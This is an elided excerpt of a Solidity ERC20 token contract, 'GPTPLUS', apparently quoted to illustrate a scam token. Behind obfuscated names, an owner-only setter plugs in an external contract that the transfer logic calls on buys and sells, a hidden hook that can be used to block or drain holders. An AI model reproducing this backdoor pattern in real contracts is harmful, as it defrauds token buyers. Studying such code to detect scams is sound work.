...
contract TokenM is ERC20 {
    ...
    IUserAmountooedse public ooedse;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("GPTPLUS", "GPTPLUS") {
    ...
    function cuiereesBfefieRcce(IUserAmountooedse _ooedse) public onlyOwner {
        ooedse = _ooedse;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                ooedse.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				ooedse.addOutAmount(from, amount);
            }else{
                ooedse.addOutAmount(from, amount);
                takeFee = false;
            }
